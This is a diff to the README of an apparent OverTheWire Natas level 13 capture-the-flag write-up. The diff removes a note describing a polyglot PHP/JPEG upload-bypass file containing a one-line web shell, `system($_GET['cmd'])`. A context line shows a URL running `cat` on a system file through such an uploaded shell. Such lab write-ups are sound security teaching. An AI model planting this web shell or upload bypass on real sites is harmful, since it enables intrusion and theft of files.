@@ -86,10 +86,4 @@ http://natas13.natas.labs.overthewire.org/upload/bldzmc4xs4.php?cmd=cat%20/etc/n
 
 ---
 
-## 📎 Scripts Developed
-
-`bypass.php`: A polyglot PHP/JPEG file (`<?php system($_GET['cmd']); ?>` with magic bytes JPEG) created directly in the terminal.  
-
----
-
 <p align="center"> <a href="../Natas12/Readme.md">⬅️ Previous</a> • <a href="../Natas14/Readme.md">Next ➡️</a> </p>
